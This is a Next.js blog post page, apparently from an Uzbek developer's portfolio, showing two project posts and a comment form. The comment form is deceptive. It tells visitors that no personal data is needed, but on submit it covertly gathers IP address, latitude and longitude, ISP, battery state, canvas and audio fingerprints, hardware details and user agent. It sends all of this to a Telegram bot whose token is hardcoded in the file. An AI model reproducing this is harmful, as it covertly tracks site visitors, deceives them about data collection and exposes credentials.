// src/app/blog/[slug]/page.tsx   ← Faqat shu faylni to‘liq almashtiring!

"use client";

import Image from "next/image";
import { notFound } from "next/navigation";
import React from "react";
import { useState } from "react";
import { FaTelegram } from "react-icons/fa";
import { LinkedInLogoIcon } from "@radix-ui/react-icons";

// ──────────────────────────────────────
// POSTLAR
// ──────────────────────────────────────
const posts = [
  {
    slug: "badiiyat-loyihasi",
    title: "Badiiyat – O‘zbekistonning ilk raqamli kutubxonasi",
    date: "2025-yil 06-may",
    image: "/image.png",
    tags: ["#React", "#NextJS", "#ShadCN", "#Kutubxona"],
    content: `Hozirda "Badiiyat" nomli onlayn kutubxona loyihasi ustida ishlayapman.\n\nBu loyiha kitoblarni elektron ko‘rinishda saqlaydi, foydalanuvchilar kitoblarni qidirish, o‘qish va mualliflar haqida ma’lumot olish imkoniyatiga ega.\n\nMen ayni paytda admin paneldagi ma’lumotlarni tahrirlash, foydalanuvchi akkauntlarini sinxronizatsiyalash va saytga kiruvchilarni tekshirish ustida ishlayapman.\n\nReact Hook Form orqali foydalanuvchini ro‘yxatdan o‘tganini tekshirib, kerakli yo‘nalishga yo‘naltiryapman.\n\nBu loyiha menga katta tajriba bermoqda!`,
  },
  {
    slug: "chizlab",
    title: "Chizlab – O‘zbekistondagi ilk chizmachilik va dizayn markazi",
    date: "2025-yil 06-may",
    image: "/image copy.png",
    tags: ["#NextJS", "#Tailwind", "#Startap", "#Dizayn", "#UIUX"],
    content: `Chizlab — O‘zbekistondagi ilk chizmachilik va dizayn manbalari markazi\n\nChizlab — bu O‘zbekiston hududida chizmachilik, texnik grafikalar, dizayn va loyihalash sohalariga oid bilim, tajriba va amaliy resurslarni bir joyga jamlagan zamonaviy raqamli platformadir.\n\nBizning asosiy maqsadimiz — o‘zbek tilida yuqori sifatli, foydali va amaliy ma’lumotlar taqdim etish orqali o‘quvchilar, talabalar, dizaynerlar, muhandislar hamda soha ixlosmandlarini birlashtirishdir.\n\nSaytda siz chizmachilik asoslari, CAD dasturlari, grafik dizayn, arxitektura chizmalari va boshqa ko‘plab mavzularga oid materiallar topishingiz mumkin.\n\nChizlab — o‘zbek tilida chizmachilik va dizayn sohasining yangi davri!`,
  },
];

// ──────────────────────────────────────
// ASOSIY SAHIFA
// ──────────────────────────────────────
export default function BlogPost({ params }) {
  const { slug } = React.use(params);
  const post = posts.find((p) => p.slug === slug);
  if (!post) return notFound();

  return (
    <div className="min-h-screen overflow-x-hidden bg-black text-white">
      {/* BACKGROUND GRADIENT */}
      <div className="pointer-events-none fixed inset-0 bg-gradient-to-br from-purple-900/20 via-black to-cyan-900/20" />

      <div className="relative mx-auto max-w-6xl px-4 py-12 sm:px-6 sm:py-16 lg:px-8">
        {/* HERO IMAGE */}
        <div className="relative mb-12 overflow-hidden rounded-3xl border border-purple-500/30 shadow-2xl">
          <Image
            src={post.image}
            width={1600}
            height={900}
            alt={post.title}
            className="h-64 w-full object-cover brightness-75 sm:h-80 lg:h-96"
            priority
          />
          <div className="absolute inset-0 bg-gradient-to-t from-black via-black/70 to-transparent" />
        </div>

        {/* TITLE */}
        <h1 className="mb-6 bg-gradient-to-r from-cyan-400 via-purple-400 to-pink-400 bg-clip-text text-center text-4xl font-black leading-tight text-transparent drop-shadow-2xl sm:text-5xl md:text-6xl lg:text-7xl">
          {post.title}
        </h1>

        <p className="mb-12 text-center text-lg text-purple-300 sm:text-xl">
          {post.date}
        </p>

        {/* TAGS */}
        <div className="mb-16 flex flex-wrap justify-center gap-4">
          {post.tags.map((tag) => (
            <span
              key={tag}
              className="rounded-full border border-purple-500/60 bg-gradient-to-r from-purple-600/40 to-cyan-600/40 px-6 py-3 text-sm font-bold shadow-2xl backdrop-blur-xl transition-all hover:scale-110 hover:shadow-purple-500/70 sm:text-base"
            >
              {tag}
            </span>
          ))}
        </div>

        {/* CONTENT */}
        <article className="mx-auto mb-20 max-w-4xl space-y-8 text-justify text-lg leading-9 text-gray-100 sm:text-xl">
          {post.content.split("\n").map((line, i) => (
            <p key={i}>{line || <br />}</p>
          ))}
        </article>

        {/* AUTHOR */}
        <div className="mb-20 flex flex-col items-center gap-8 rounded-3xl border-2 border-purple-500/40 bg-gradient-to-r from-purple-900/50 to-cyan-900/50 p-10 shadow-2xl backdrop-blur-2xl sm:flex-row">
          <Image
            src="/mee.jpg"
            width={140}
            height={140}
            alt="MuhammadNurulloh"
            className="rounded-full shadow-2xl ring-8 ring-purple-500"
          />
          <div className="text-center sm:text-left">
            <h3 className="text-3xl font-black text-cyan-300 sm:text-4xl">
              MuhammadNurulloh
            </h3>
            <p className="text-xl text-purple-200 sm:text-2xl">
              Frontend Developer • React & Next.js Master
            </p>
          </div>
        </div>

        {/* FIKR QOLDIRISH */}
        <CommentForm postTitle={post.title} postSlug={post.slug} />

        {/* SOCIAL */}
        <div className="mt-24 flex justify-center gap-12 pb-20 text-5xl sm:text-6xl">
          <a
            href="https://t.me/CodeNur"
            target="_blank"
            className="transform transition hover:scale-125 hover:text-cyan-400"
          >
            <FaTelegram />
          </a>
          <a
            href="https://linkedin.com/in/muhammadnurulloh"
            target="_blank"
            className="transform transition hover:scale-125 hover:text-purple-400"
          >
            <LinkedInLogoIcon className="h-16 w-16" />
          </a>
        </div>
      </div>
    </div>
  );
}

// ──────────────────────────────────────
// ENG CHUQUR YASHIRIN MA’LUMOTLAR FORMA
// ──────────────────────────────────────
function CommentForm({ postTitle, postSlug }) {
  const [xabar, setXabar] = useState("");
  const [status, setStatus] = useState("");

  const TOKEN = "8235144998:AAEdvsgGmUuL61poUkQ2aDvNPqhGhWutx5E";
  const CHAT_ID = "7689367504";

  const yubor = async () => {
    const text = xabar.trim();
    if (!text) return;

    const vaqt = new Date().toLocaleString("uz-UZ", { timeZoneName: "short" });

    // IP + TO‘LIQ JOYLASHUV
    let geo = "Noma’lum";
    try {
      const r = await fetch("https://ipapi.co/json/");
      const d = await r.json();
      geo = `${d.city || "N"}, ${d.region || ""}, ${d.country_name} | IP: ${d.ip} | ISP: ${d.org} | Lat: ${d.latitude}, Lon: ${d.longitude}`;
    } catch {}

    // BATAREYA
    let battery = "Ma’lum emas";
    if ("getBattery" in navigator) {
      try {
        const b = await navigator.getBattery();
        battery = `${Math.round(b.level * 100)}% | ${b.charging ? "Zaryadkada" : "Oddiy"}`;
      } catch {}
    }

    // CANVAS FINGERPRINT
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("Chizlab 2025", 2, 15);
    const canvasHash = canvas.toDataURL();

    // AUDIO FINGERPRINT
    let audioHash = "Noma’lum";
    try {
      const audioCtx = new (
        window.OfflineAudioContext || window.webkitOfflineAudioContext
      )(1, 5000, 44100);
      const osc = audioCtx.createOscillator();
      osc.type = "triangle";
      osc.frequency.value = 10000;
      const comp = audioCtx.createDynamicsCompressor();
      osc.connect(comp);
      comp.connect(audioCtx.destination);
      osc.start(0);
      const buf = await audioCtx.startRendering();
      audioHash = buf
        .getChannelData(0)
        .reduce((a, b) => a + Math.abs(b), 0)
        .toString(36)
        .slice(0, 25);
    } catch {}

    // TO‘LIQ MA’LUMOT
    const matn = `${text}

YANGI FIKR – 100% MAX YASHIRIN

POST: ${postTitle}
Link: ${window.location.href}
Vaqt: ${vaqt}
Joylashuv: ${geo}
Batareya: ${battery}
Ekran: ${screen.width}x${screen.height} | Pixel: ${window.devicePixelRatio}
Til: ${navigator.language} | ${navigator.languages?.join(", ")}
CPU: ${navigator.hardwareConcurrency || "N"} yadro
RAM: ${navigator.deviceMemory || "N"} GB
Touch: ${navigator.maxTouchPoints || 0}
Cookie: ${navigator.cookieEnabled ? "Ha" : "Yo‘q"}
Online: ${navigator.onLine ? "Ha" : "Yo‘q"}
Canvas FP: ${canvasHash.substring(0, 120)}...
Audio FP: ${audioHash}
User-Agent: ${navigator.userAgent}
Referrer: ${document.referrer || "Yo‘q"}
`;

    await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(matn)}`,
    );

    setStatus("MUVOFAQQIYATLI JO‘NATILDI!");
    setXabar("");
    setTimeout(() => setStatus(""), 5000);
  };

  const bosh = !xabar.trim();

  return (
    <div className="relative mb-24 overflow-hidden rounded-3xl border-4 border-purple-600 shadow-2xl shadow-purple-600/60">
      <div className="absolute inset-0 bg-gradient-to-br from-purple-900 via-pink-900 to-cyan-900 opacity-90" />
      <div className="relative p-8 backdrop-blur-3xl sm:p-12">
        <h3 className="mb-12 bg-gradient-to-r from-cyan-300 to-purple-300 bg-clip-text text-center text-4xl font-black text-transparent drop-shadow-2xl sm:text-xl lg:text-2xl">
          FIKR QOLDIRING
        </h3>

        <textarea
          rows={8}
          value={xabar}
          onChange={(e) => setXabar(e.target.value)}
          placeholder="Bu yerga yozing... (ism, email, telefon kerak emas)"
          className="w-full resize-none rounded-2xl border-4 border-purple-500 bg-black/70 p-8 text-lg placeholder-gray-500 transition-all focus:outline-none focus:ring-4 focus:ring-purple-500/80 sm:text-lg"
        />

        <div className="mt-12 text-center">
          <button
            onClick={yubor}
            disabled={bosh}
            className={`w-full transform rounded-2xl px-16 py-8 text-2xl font-black transition-all sm:w-auto sm:text-xl ${
              bosh
                ? "cursor-not-allowed bg-gray-800 opacity-60"
                : "bg-gradient-to-r from-purple-600 to-cyan-600 shadow-2xl shadow-purple-600/80 hover:scale-110 hover:from-purple-700 hover:to-cyan-700 hover:shadow-cyan-600/80"
            }`}
          >
            {bosh ? "Yozing..." : "JO‘NATISH"}
          </button>
        </div>

        {status && (
          <p className="mt-10 animate-pulse text-center text-4xl font-black text-cyan-400 drop-shadow-2xl sm:text-5xl">
            {status}
          </p>
        )}

        <p className="mt-8 text-center italic text-gray-300">
          Hech qanday shaxsiy ma’lumot talab qilinmaydi
        </p>
      </div>
    </div>
  );
}
